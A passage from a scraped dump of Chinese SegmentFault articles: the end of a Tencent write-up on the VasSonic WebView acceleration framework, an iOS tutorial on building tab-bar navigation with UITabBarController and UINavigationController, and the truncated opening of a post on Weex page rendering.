<li>从外网统计数据来看，用户的终端耗时在1s以上，这意味着在这1s多的时间里，网络完全是空闲在等待的，非常浪费；</li>
<li>页面的资源和数据完全依赖于网络，特别是用户在弱网络场景下，页面会出现很长时间的白屏，体验非常差；</li>
<li>因为页面的数据依赖于动态拉取，加载完页面后，往往是看到一些模块先转菊花，再展示，体验也是不好的。同时这里涉及到较多数据更新，经常要更新DOM，性能上也有不少开销。</li>
</ol>
<p>所以针对以上几个问题，我们也对应做了很多优化和探索。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711031"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""问题"" title=""问题""></span></p>
<h2>VasSonic的前世</h2>
<h3>优化终端</h3>
<p>针对终端耗时1s以上的情况，我们对手Q WebView框架进行了重构：</p>
<ol>
<li>启动流程彻底拆分，设计为一个状态机按序按需执行</li>
<li>View相关拆分模块化设计，尽可能懒加载，IO异步化</li>
<li>X5内核在手Q中的独立进程中提前预加载</li>
<li>创建WebView对象复用池</li>
</ol>
<p>关于第四点，我们想分享一些Android平台上的细节，由于Android系统的生态原因，导致用户的系统版本和系统Webkit内核处于极其分裂状态，所以我们公司在手Q和微信统一使用X5内核。相对系统WebView来说，首次启动X5内核时，创建WebView比较耗时，因此我们尽量想复用WebView，但是WebView却是与Activity Context绑定。销毁复用的时候，需要释放Activity的Context，否则会内存泄露。针对这种情况，有没有一种两全其美的办法呢？</p>
<p>计算机有一句经典的名言：<code>计算机领域任何一个问题都可以通过引入中间层来解决</code>。于是我们通过包装的方式，实现了一个Context的壳，真正的实现体包装在里面，逻辑调用真正调用到对应的实现体的函数。 经过实验发现，Android系统本身提供了这么一个<code>MutableContextWrapper</code>，作为Context的一个中间层。</p>
<p>我们会将Activity context包在MutableContextWrapper里面，destory的时候，会将WebView的Context设置为Application的Context，从而释放Activity Context。<br>类似如下：</p>
<pre><code class=""Java"">
//precreate WebView
MutableContextWrapper contextWrapper = new MutableContextWrapper(BaseApplicationImpl.sApplication);
mPool[0] = new WebView(contextWrapper);

//reset WebView 
ct =(MutableContextWrapper)webview.getContext();
ct.setBaseContext(getApplication());

//reuse WebView
((MutableContextWrapper)webview.getContext()).setBaseContext(activityContext);
</code></pre>
<h3>静态直出</h3>
<p>“直出”这个概念对前端同学来说，并不陌生。为了优化首屏体验，大部分主流的页面都会在服务器端拉取首屏数据后通过NodeJs进行渲染，然后生成一个包含了首屏数据的Html文件，这样子展示首屏的时候，就可以解决内容转菊花的问题了。<br>当然这种页面“直出”的方式也会带来一个问题，服务器需要拉取首屏数据，意味着服务端处理耗时增加。<br>不过因为现在Html都会发布到CDN上，WebView直接从CDN上面获取，这块耗时没有对用户造成影响。<br>手Q里面有一套自动化的构建系统Vnues，当产品经理修改数据发布后，可以一键启动构建任务，Vnues系统就会自动同步最新的代码和数据，然后生成新的含首屏Html，并发布到CDN上面去。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711032"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""直出"" title=""直出""></span></p>
<h3>离线预推</h3>
<p>页面发布到CDN上面去后，那么WebView需要发起网络请求去拉取。当用户在弱网络或者网速比较差的环境下，这个加载时间会很长。于是我们通过离线预推的方式，把页面的资源提前拉取到本地，当用户加载资源的时候，相当于从本地加载，即使没有网络，也能展示首屏页面。这个也就是大家熟悉的离线包。<br>手Q使用7Z生成离线包, 同时离线包服务器将新的离线包跟业务对应的历史离线包进行BsDiff做二进制差分，生成增量包，进一步降低下载离线包时的带宽成本，下载所消耗的流量从一个完整的离线包（253KB）降低为一个增量包（3KB）。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010711033"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""带宽优化"" title=""带宽优化""></span></p>
<p>经过一系列优化后，在Android平台上，点击到页面首屏展示的耗时从平均<em>3s</em>多降低为<em>1.8s</em>，优化<em>40% 以上</em>。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711034"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""数据对比"" title=""数据对比""></span></p>
<h2>VasSonic的诞生</h2>
<p>虽然通过静态直出和离线预推等方式优化后，速度已经达到1.8s，但还存在很大的优化空间，当我们准备持续深入优化时，我们的业务形态发生了新的变化。</p>
<p>之前我们页面内容的数据主要是由产品经理要配置的，用户看到的内容基本都是一样的。而现在页面为了更好地为用户推荐喜欢的内容，我们后台引入机器学习和随机算法来做智能个性化推荐。比如左边新用户推荐的是新货精选，而右边活跃用户展示的是潮品推荐。另外还有部分的内容是随机算法推荐的。这意味着不同用户看到的内容是不同的，同一个用户不同时间看到的内容也有可能不同。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711035"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""新业务"" title=""新业务""></span></p>
<p>所以为了满足业务的需求，我们只能实时拉取用户数据并在服务端渲染后返回给客户端，也就是动态直出的方案。</p>
<p>但是动态直出方案存在几个比较明显的问题：</p>
<ol>
<li>服务端实时拉取数据渲染导致白屏时间长，因为服务器要先实时拉取个人数据，然后进行渲染直出，这个耗时不可控；</li>
<li>首屏无法使用离线预推等缓存策略，因为每个用户看到的内容不一样，我们无法通过静态直出的方式那样把Html全部发布到CDN；</li>
</ol>
<p>虽然动态直出方案下，页面首屏无法通过离线预推等方式进行加载优化，但前面优化积累的经验给我们提供了思路：要优化白屏问题，核心还是得从提升资源加载速度方向入手。所以我们重点在资源加载方面进行了深度优化。</p>
<h3>并行加载</h3>
<p>首先在加载流程方面，我们发现这里WebView访问依然是串行的， WebView要等终端初始化完成之后，才发起请求。虽然终端耗时优化了不少，但是从外网的统计数据来看，终端初始化还是存在几百毫秒的耗时，而这段时间内网络是在空等的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711036"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""串行"" title=""串行""></span></p>
<p>因此性能上不够极致，我们优化代码，这两个操作并行处理，流程改为：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711037"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""并行"" title=""并行""></span></p>
<p>并行处理后速度有所改善，但我们发现在某些场景下，终端初始化比较快，但数据没有完成返回，这意味着内核在空等，而内核是支持边加载边渲染的，我们在并行的同时，能否也利用内核的这个特性呢？</p>
<p>于是我们加入了一个中间层来桥接内核和数据，内部称为流式拦截：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711038"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""桥接流"" title=""桥接流""></span></p>
<ol>
<li>启动子线程请求页面主资源，子线程中不断讲网络数据读取到内存中，也就是网络流(NetStream)和内存流(MemStream)之间的转换；</li>
<li>当WebView初始化完成的时候，提供一个中间层BridgeStream来连接WebView和数据流；</li>
<li>当WebView读取数据的时候，中间层BridgeStream会先把内存的数据读取返回后，再继续读取网络的数据。</li>
</ol>
<p>通过这种桥接流的方式，整个内核无需等待，继续做到边加载边解析。这种并行的方式让首屏的速度优化<em>15%以上</em>，进一步提升了页面加载速度。</p>
<h3>动态缓存</h3>
<p>通过并行加载，我们极大地提升了WebView请求的速度，但是在弱网络场景下白屏时间还是非常长，用户体验非常糟糕。于是我们在思考，是否能够将用户的已经加载的页面内容缓存下来，等用户下此点击页面的时候，我们先加载展示页面缓存，第一时间让用户看到内容，然后同时去请求新的页面数据，等新的页面数据拉取下来之后，我们再重新加载一遍即可。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711039"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""动态缓存"" title=""动态缓存""></span></p>
<p>保存页面内容这个工作很简单，因为现在我们资源读取都是通过中间层BridgeStream来管理的，只需要将整个读取的内容缓存下来即可。<br>于是我们就按动态缓存这种方案去实现了，但很快就发现了问题。用户打开页面之后，先是看到历史页面，等用户准备去操作的时候，突然页面白闪一下，重新加载了一遍，这种体验非常差，特别在一些低端机器上，这个白闪的过程太明显，非常影响体验，这是用户和产品经理都不能接受的。于是我们在思考，能否只做局部的刷新，仅刷新变化的元素呢？</p>
<p>通过分析，我们发现同一个用户的页面，大部分数据都是不变的，经常变化的只有少量数据，于是我们提出了模板(template)和数据块(data)的概念：页面中经常变化的数据我们称为数据块，除了数据块之外的数据称为模板。</p>
<h3>页面分离</h3>
<p>我们将整个页面html通过VasSonic标签进行划分，包裹在标签中的内容为data，标签外的内容为模版。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711040"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""页面规范"" title=""页面规范""></span></p>
<p>首先我们对Html内容进行了扩展，通过代码注释的方式，增加了“sonicdiff-xxx”来标注一个数据块的开始与结束。<br>而模板就是将数据块抠掉之后的Html，然后通过{albums}来表示这个是一个数据块占位。<br>数据就是JSON格式，直接Key-Value。<br>当然，为了完美地兼容Html，我们对协议头部进行了扩展，比如增加accept-diff来标注是否支持增量更新、template-tag来标注模板的md5是多少等。OK，有了上面这个规则或者公式后，我们就可以实现增量更新了。</p>
<h3>请求规范约定</h3>
<p>VasSonic为了支持区分客户端是否支持增量更新等能力，对头部字段进行了扩展</p>
<table>
<thead><tr>
<th align=""center"">字段</th>
<th align=""center"">说明</th>
<th align=""center"">请求头(Y/N)</th>
<th align=""center"">响应头(Y/N)</th>
</tr></thead>
<tbody>
<tr>
<td align=""center"">accept-diff</td>
<td align=""center"">表示终端是否支持VasSonic模式，true为支持，否则不支持</td>
<td align=""center"">Y</td>
<td align=""center"">N</td>
</tr>
<tr>
<td align=""center"">If-none-match</td>
<td align=""center"">本地缓存的etag，给服务端判断是否命中304</td>
<td align=""center"">Y</td>
<td align=""center"">N</td>
</tr>
<tr>
<td align=""center"">etag</td>
<td align=""center"">页面内容的唯一标识(哈希值)</td>
<td align=""center"">N</td>
<td align=""center"">Y</td>
</tr>
<tr>
<td align=""center"">template-tag</td>
<td align=""center"">模版唯一标识(哈希值)，客户端使用本地校验 或 服务端使用判断是模板有变更</td>
<td align=""center"">Y</td>
<td align=""center"">Y</td>
</tr>
<tr>
<td align=""center"">template-change</td>
<td align=""center"">标记模版是否变更，客户端使用</td>
<td align=""center"">N</td>
<td align=""center"">Y</td>
</tr>
<tr>
<td align=""center"">cache-offline</td>
<td align=""center"">客户端端使用，根据不同类型进行不同行为</td>
<td align=""center"">N</td>
<td align=""center"">Y</td>
</tr>
</tbody>
</table>
<h3>cache-offline字段说明</h3>
<table>
<thead><tr>
<th align=""center"">字段</th>
<th align=""center"">说明</th>
</tr></thead>
<tbody>
<tr>
<td align=""center"">true</td>
<td align=""center"">缓存到磁盘并展示返回内容</td>
</tr>
<tr>
<td align=""center"">false</td>
<td align=""center"">展示返回内容，无需缓存到磁盘</td>
</tr>
<tr>
<td align=""center"">store</td>
<td align=""center"">缓存到磁盘，如果已经加载缓存，则下次加载，否则展示返回内容</td>
</tr>
<tr>
<td align=""center"">http</td>
<td align=""center"">容灾字段，如果http表示终端六个小时之内不会采用sonic请求该URL</td>
</tr>
</tbody>
</table>
<h3>模式介绍</h3>
<p>VasSonic根据本地是否有缓存以及本地缓存数据跟服务器数据的差异情况分为以下四种模式。</p>
<table>
<thead><tr>
<th align=""center"">模式</th>
<th align=""center"">说明</th>
<th align=""center"">条件</th>
</tr></thead>
<tbody>
<tr>
<td align=""center""><strong>首次加载</strong></td>
<td align=""center"">本地没有缓存，即第一次加载页面</td>
<td align=""center"">etag为空值或template_tag为空值</td>
</tr>
<tr>
<td align=""center""><strong>完全缓存</strong></td>
<td align=""center"">本地有缓存，且缓存内容跟服务器内容完全一样</td>
<td align=""center"">etag一致</td>
</tr>
<tr>
<td align=""center""><strong>数据更新</strong></td>
<td align=""center"">本地有缓存，本地模版内容跟服务器模版内容一样，但数据块有变化</td>
<td align=""center"">etag不一致 且 template_tag一致</td>
</tr>
<tr>
<td align=""center""><strong>模版更新</strong></td>
<td align=""center"">本地有缓存，缓存的模版内容跟服务器的模版内容不一样</td>
<td align=""center"">etag不一致 且 template_tag不一致</td>
</tr>
</tbody>
</table>
<h4>首次加载</h4>
<p>我们会在请求头部带上支持accept-diff为true和sdk版本号等标识着首次加载的信息。当请求返回后，VasSonic会在延迟几秒后(避免激烈IO竞争)将页面抽离成模板和数据并保存到本地。此时终端缓存目录下，该页面将对应三个缓存文件xxx.html、xxx.template、xxx.data，其中xxx是该页面的唯一标识(即sonicSessionId)。</p>
<p>对于页面非首次加载场景，VasSonic优先加载本地缓存， 同时我们会在请求头部带上当前缓存和模板的md5，后台进行模板md5对比之后，分为以下几种情况：</p>
<h4>非首次加载之完全缓存</h4>
<p>本地有缓存，且缓存内容跟服务器内容完全一样.</p>
<h4>非首次加载之增量数据</h4>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711041"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""增量数据"" title=""增量数据""></span></p>
<p>如果模板发现没有变化，那么会在响应头部返回template-change=false，同时响应包体返回的数据不再是完整的html，而是一段JSON数据，及全部的数据块。我们现在需要跟本地数据进行差分，找出真正的增量数据，如上图中，后台返回了N个数据，实际上仅有一个数据是有变化的，那么我们仅需要将这个变化的数据提交到页面即可。一般场景下，这个差异的数据比全部数据要小很多。如果页面拆分数据得更细，那么页面的变动就更小，这个取决于前端同学对数据块的细化程度。</p>
<p>获得变化数据块(diff_data)后，客户端只需要通知页面页面设置的回调接口(getDiffDataCallback)进行界面元素更新即可。这里javascript的通信方式也可以自由定义(可以使用webview标准的javascript通信方式，也可以使用伪协议的方式)，只要页面跟终端协商一致就可以。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010711042"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""提交增量"" title=""提交增量""></span></p>
<p>对于数据更新这种场景，终端还会将新的数据和模板拼接成为新的页面，保持缓存最新。当终端初始化比较慢的时候，WebView去加载缓存的时候，这个页面可能已经是最新的了，连数据刷新都不需要。</p>
<h4>非首次加载之模板更新</h4>
<p>与数据更新模式不一样，由于业务需求，页面的模板会发生更改。当终端在获取到新的模板和数据后，本地在子线程中进行合并，生成一个新的缓存，然后回调通知终端，刷新WebView来加载新的缓存。</p>
<p>我们来看一下最终的流程图，跟动态缓存对比，有不少细节优化：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711043"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""整体流程"" title=""整体流程""></span></p>
<p>我们从第2步开始，SonicSession首先会去读取缓存。会抛个消息通知WebView读取缓存，如果Webview已经准备好，则直接加载缓存，如果没有，则缓存先放在内存里面。同时SonicSession也会带上模板等信息到后台拉取新的内容，后台经过Sonic-Diff之后，会返回新的数据。SonicSession拿到新的数据后，首先会跟本地数据进行Diff，如果发现WebView已经加载缓存，则直接提交增量数据给页面。否则继续拼接最新的页面，替换掉内存里面的缓存，同时保存到本地。这个时候WebView如果Ready，则直接进行第5步load最新的内容即可。</p>
<h4>效果统计</h4>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010711044"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""效果统计"" title=""效果统计""></span></p>
<p>这个是我们外网的统计数据。在数据更新模式下，首屏的耗时在1s左右，相比普通的动态直出，优化了50%以上。模板更新这个会比首次高，是因为加载了两次页面，不过从模式占比上来看，我们大部分页面都是数据更新。针对模板更新这种耗时比较高的情况，前面优化积累的经验给我们提供了思路，核心还是从提前获取资源方向入手，因此我们优先考虑如何预加载模板更新。</p>
<h4>预加载</h4>
<p>实际上整个SonicSession在没有WebView的情况下，也是可以独立完成所有逻辑的，当用户点击页面的时候，我们在将WebView和SonicSession绑定起来即可。于是我们支持了两种预加载的模式，一种是通过后台push的方式，来提前获取数据。还有一种就是JSAPI，页面可以调用JSAPI来预加载用户可能操作的下一个页面。通过这两种方式，我们可以把需要的增量更新数据提前拉取回来<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010711045"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""预加载"" title=""预加载""></span></p>
<h2>效果对比</h2>
<table>
<thead><tr>
<th align=""center"">Pic 1: 没有使用VasSonic</th>
<th align=""center"">Pic 2: 使用VasSonic</th>
</tr></thead>
<tbody><tr>
<td align=""center""><span class=""img-wrap""><img data-src=""/img/remote/1460000010711046"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""default mode"" title=""default mode""></span></td>
<td align=""center""><span class=""img-wrap""><img data-src=""/img/remote/1460000010711047"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""VasSonic mode"" title=""VasSonic mode""></span></td>
</tr></tbody>
</table>
<h2>展望未来</h2>
<p>开源只是故事的开始，我们仍会持续对 VasSonic 做改进，包括更易用的接口、更好的性能、更高的可靠性，同时快速响应解决开源后的issue和PR。这些改进最终也会原封不动地在手Q内使用，这一切都是为了更快的WebView加载速度。 </p>
<p>Talk is cheap，read the fucking code. If you are interested in VasSonic, don't forget to STAR <a href=""https://github.com/Tencent/VasSonic"" rel=""nofollow noreferrer"">VasSonic</a>.<br>Thank you for reading ~</p>

                ", 腾讯祭出大招VasSonic，让你的H5页面首屏秒开,1531971935,243,1,84,1,1,https://segmentfault.com/a/1190000010711024
48,1,0,6,"
                    
<h2>前言</h2>
<p>当app中有多个控制器的时候，就需要对这些控制器进行管理，用一个控制器去管理其他多个控制器；如图所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010432196"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>IOS UIView 提供了两个特殊的控制器，UINavigationController和UITabBarController去管理其它控制器。</p>
<p>本文以下面的一个简单例子加以说明基本用法：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000010432197"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>UIWindow 和 UIViewController 的基本内容</h2>
<p>新建一个 Single View Application 工程，在iOS应用中，每个程序得main函数中都调用了UIApplicationMain函数。</p>
<pre><code>#import &lt;UIKit/UIKit.h&gt;
#import ""AppDelegate.h""

int main(int argc, char * argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}</code></pre>
<p>先来看看UIApplicationMain函数的原型：</p>
<pre><code>UIKIT_EXTERN int UIApplicationMain(
  int argc, 
  char *argv[], 
  NSString * __nullable principalClassName, 
  NSString * __nullable delegateClassName
);</code></pre>
<p>前面的argc和argv是ISO C标准的main函数的参数，直接传递给UIApplicationMain进行相关处理，principalClassName是应用程序类的名字，该类必须继承自UIApplication类，而delegateClassName是应用程序类的代理类。如果主要nib文件（在info.plist文件中指定，key是NSMainNibFile）存在，就会在nib文件对象里寻找Application对象和连接它的delegate。此函数会根据principalClassName创建UIApplication对象，然后根据delegateClassName创建一个delegate对象，并将UIApplication对象中的delegate属性设置为delegate对象，接着会建立应用的main runloop，进行事件的处理，首先调用<code>application:didFinishLaunchingWithOptions</code>。程序正常退出时才返回（如今iOS支持后台运行，系统在必要时会强行杀死不用的进程，一般这个函数不等返回进程就终止了）。</p>
<pre><code>// 程序启动完成调用
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // 创建Window
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    // 设置Window的背景颜色
    self.window.backgroundColor = [UIColor whiteColor];
    
    // 设置根控制器
    ViewController *vc = [[ViewController alloc] init];
    self.window.rootViewController = vc;

    // 设置并显示主窗口
    [self.window makeKeyAndVisible];
    
    return YES;
}</code></pre>
<p>UIWindow是一种特殊的UIView，通常在一个应用中只会有一个UIWindow。在ios程序启动完成后，建立的第一个视图控件就是UIWindow，接着创建一个控制器的View，最后将控制器的View添加到UIWindow上，于是控制器的View就是显示到屏幕上了。一个ios程序之所以能显示在屏幕上，完全是因为它有UIWindow，也就是说没有UIWindow就看不到任何UI界面。</p>
<p><strong>控制器的创建：</strong></p>
<pre><code>UIViewController *vc = [UIViewController alloc] init];</code></pre>
<p>可以用isViewLoaded方法判断一个UIViewController的view是否已经被加载；控制器的view加载完毕就会调用viewDidLoad方法。</p>
<p><strong>将view添加到UIWindow：</strong></p>
<ul><li>直接将view添加到UIWindow中，并不理会view对应的控制器。</li></ul>
<pre><code>- (void)addSubView:(UIView *)view;</code></pre>
<ul><li>通过设置根控制器，自动将rootViewController的view添加到UIWindow中，负责管理rootViewController的生命周期。</li></ul>
<pre><code>@property(nonatomic,retain) UIViewController *rootViewController;</code></pre>
<p><strong>获取 RootViewController：</strong></p>
<p>第一种方法：</p>
<pre><code>UIWindow *window = [UIApplication sharedApplication].keyWindow;
UIViewController *rootViewController = window.rootViewController;</code></pre>
<p>第二种方法：</p>
<pre><code>AppDelegate *appdelegate = (AppDelegate *)[UIApplication sharedApplication].delegate;
UIViewController *rootViewController = appdelegate.window.rootViewController;</code></pre>
<h2>UINavigationController 和 UITabBarController 的基本内容</h2>
<p>UINavigationController以栈的形式保存子控制器，使用push方法能将某个控制器压入栈，使用pop方法可以移除栈顶控制器。</p>
<p>打开 ViewController 的方式：</p>
<pre><code> - (void)pushViewController:(UIViewController*)viewController animated:(BOOL)animated;</code></pre>
<p>三种移除 ViewController 的方式：</p>
<pre><code>将栈顶的控制器移除
- (UIViewController*)popViewControllerAnimated:(BOOL)animated;
回到指定的子控制器
- (NSArray*)popToViewController:(UIViewController*)viewController animated:(BOOL)animated;
回到根控制器（栈底控制器）
- (NSArray*)popToRootViewControllerAnimated:(BOOL)animated;</code></pre>
<p><strong>初始化UINavigationController：</strong></p>
<p>方法一：</p>
<pre><code>UINavigationController *nv = [[UINavigationController alloc] init];  </code></pre>
<p>方法二：</p>
<pre><code>UINavigationController *nv = [[UINavigationController alloc] initWithRootViewController:rootViewController];</code></pre>
<p>UITabBarController和UINavigationController类似,UITabBarController也可以轻松地管理多个控制器,轻松完成控制器之间的切换,典型的例子就是QQ、微信等应⽤。但是UITabBarController其管理的视图一直存在,而UINavigationController在pop后会销毁掉，释放内存。UITabBarController通常作为整个程序的rootViewController，而且不能添加到别的container viewController中。</p>
<p><strong>UITabBarController的使用步骤：</strong></p>
<ol>
<li>初始化UITabBarController</li>
<li>创建子控制器（viewcontroller）</li>
<li>把子控制器添加到UITabBarController</li>
<li>设置UIWindow的rootViewController为UITabBarController</li>
</ol>
<p><strong>将子控制器添加到UITabBarController：</strong></p>
<p>方法一：添加单个子控制器</p>
<pre><code>- (void)addChildViewController:(UIViewController*)childController;</code></pre>
<p>方法二：添加多个子控制器</p>
<pre><code>view.viewControllers = NSArray *childController;</code></pre>
<p><strong>UITabBarController中嵌套UINavigationController：</strong></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010432198"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>UINavigationController中嵌套UITabBarController：</strong></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000010432199"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>项目实战</h2>
<p>将UITabBarController的逻辑提取到一个独立的ViewController中。可以新建一个继承于UITabBarController的ViewController。</p>
<p><strong>AppDelegate.m：</strong></p>
<pre><code>// 程序启动完成调用
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // 创建Window
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    // 设置Window的背景颜色
    self.window.backgroundColor = [UIColor whiteColor];
    
    // 设置根控制器
    ViewController *vc = [[ViewController alloc] init];
    self.window.rootViewController = vc;

    // 设置并显示主窗口
    [self.window makeKeyAndVisible];
    
    return YES;
}</code></pre>
<p><strong>ViewController.h:</strong></p>
<pre><code>@interface ViewController : UITabBarController

@end</code></pre>
<p><strong>ViewController.m:</strong></p>
<pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    
    // 创建子控制器
    HomeViewController *homeVC=[[HomeViewController alloc] init];
    [self setTabBarItem:homeVC.tabBarItem
                  title:@""首页""
              titleSize:13.0
          titleFontName:@""HeiTi SC""
          selectedImage:@""i_tab_home_selected""
     selectedTitleColor:[UIColor redColor]
            normalImage:@""i_tab_home_normal""
       normalTitleColor:[UIColor grayColor]];
    
    BlogViewController *blogVC=[[BlogViewController alloc] init];
    [self setTabBarItem:blogVC.tabBarItem
                  title:@""博文""
              titleSize:13.0
          titleFontName:@""HeiTi SC""
          selectedImage:@""i_tab_blog_selected""
     selectedTitleColor:[UIColor redColor]
            normalImage:@""i_tab_blog_normal""
       normalTitleColor:[UIColor grayColor]];
    
    UINavigationController *homeNV = [[UINavigationController alloc] initWithRootViewController:homeVC];
    UINavigationController *blogNV = [[UINavigationController alloc] initWithRootViewController:blogVC];
    // 把子控制器添加到UITabBarController
    self.viewControllers = @[homeNV, blogNV];
}</code></pre>
<p>我们通常需要对tabBarItem进行设置，可以封装一个setTabBarItem方法，只需要进行简单的配置即可。</p>
<pre><code>- (void)setTabBarItem:(UITabBarItem *)tabbarItem
                title:(NSString *)title
            titleSize:(CGFloat)size
        titleFontName:(NSString *)fontName
        selectedImage:(NSString *)selectedImage
   selectedTitleColor:(UIColor *)selectColor
          normalImage:(NSString *)unselectedImage
     normalTitleColor:(UIColor *)unselectColor
{
    
    //设置图片
    tabbarItem = [tabbarItem initWithTitle:title image:[[UIImage imageNamed:unselectedImage]imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal] selectedImage:[[UIImage imageNamed:selectedImage]imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal]];
    
    // S未选中字体颜色
    [[UITabBarItem appearance] setTitleTextAttributes:@{NSForegroundColorAttributeName:unselectColor,NSFontAttributeName:[UIFont fontWithName:fontName size:size]} forState:UIControlStateNormal];
    
    // 选中字体颜色
    [[UITabBarItem appearance] setTitleTextAttributes:@{NSForegroundColorAttributeName:selectColor,NSFontAttributeName:[UIFont fontWithName:fontName size:size]} forState:UIControlStateSelected];
}</code></pre>
<p>然后对每个子ViewController进行自定义即可，如BlogViewController.h可以这样写：</p>
<pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    
    UIButton *helloBtn = [[UIButton alloc] initWithFrame:CGRectMake(100, 100, SCREEN_WIDTH - 200, 50)];
    helloBtn.backgroundColor = [UIColor redColor];
    [helloBtn setTitle:@""hello world"" forState:UIControlStateNormal];
    [helloBtn addTarget:self action:@selector(showToast) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:helloBtn];
}

- (void)showToast{
    // 打开新ViewController
    BlogDetailViewController *blogDetail = [[BlogDetailViewController alloc] init];
    blogDetail.hidesBottomBarWhenPushed=YES;
    [self.navigationController pushViewController:blogDetail animated:YES];
}</code></pre>
<blockquote><p>本文源代码：<a href=""https://github.com/zhaomenghuan/learn-ios/tree/master/example/UITabBarController"" rel=""nofollow noreferrer"">https://github.com/zhaomenghu...</a></p></blockquote>
<h2>参考</h2>
<p><a href=""http://blog.csdn.net/yang198907/article/details/49807011"" rel=""nofollow noreferrer"">iOS －App主流框架UINavigationController &amp;&amp; UITabBarController的简单使用</a></p>
<hr>
<p>我最近在 segmentfault 开了5+ App开的系列讲座，欢迎前来围观：</p>
<ul>
<li><a href=""https://segmentfault.com/l/1500000009542402?r=bPqXdU"" rel=""nofollow noreferrer"">html5+ App开发工程化实践之路</a></li>
<li><a href=""https://segmentfault.com/l/1500000010042078?r=bPqXdU"" rel=""nofollow noreferrer"">html5+ App开发之 Android 平台离线集成 5+ SDK</a></li>
</ul>

                ", IOS 学习笔记之基于 UITabBarController 的主流 APP 底部导航栏实现,1531971937,537,1,641,1,1,https://segmentfault.com/a/1190000010432191
49,1,0,6,"
                    
<p>这篇文章介绍了一个 Weex 页面的渲染过程，涉及很多框架内部的细节。</p>
<h2>“哟”</h2>
<p><span class=""img-wrap""><img data-src=""/img/bVRSAY?w=2436&amp;h=1370"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<blockquote><p><a href=""http://dotwe.org/vue/ee9fcff158ae82631f101782c7ac0d57"" rel=""nofollow noreferrer"">在线例子</a>，使用 <a href=""http://weex.apache.org/cn/playground.html"" rel=""nofollow noreferrer"">Weex Playground</a> 扫码即可预览。</p></blockquote>
<p>这是一个使用 <a href=""https://vuejs.org/v2/guide/"" rel=""nofollow noreferrer"">Vue.js 2.x</a> 语法写的一个小例子，极其简单，就一个字，可以借助 Weex 在移动端中渲染生成原生组件。</p>
<p>这也是实现文字水平垂直居中的最简例子。</p>
<h3>源代码</h3>
<p>组件代码：</p>
<pre><code class=""html"">&lt;!-- yo.vue --&gt;
&lt;template&gt;
  &lt;div style=""justify-content:center;""&gt;
    &lt;text class=""freestyle""&gt;哟&lt;/text&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;style scoped&gt;
  .freestyle {
    text-align: center;
    font-size: 200px;
  }
&lt;/style&gt;</code></pre>
<p>除了组件代码以外，还需要一个入口文件指定挂载点并触发渲染：</p>
<pre><code class=""js"">// entry.js
import Vue from 'vue'
import Yo from 'yo.vue'

Yo.el = '#root'
new Vue(Yo)</code></pre>
<h2>编译</h2>
<p><code>.vue</code> 文件是无法被直接执行的，必须要编译成 <code>.js</code> 格式的文件才可以被 Web 或 Weex 平台执行。</p>
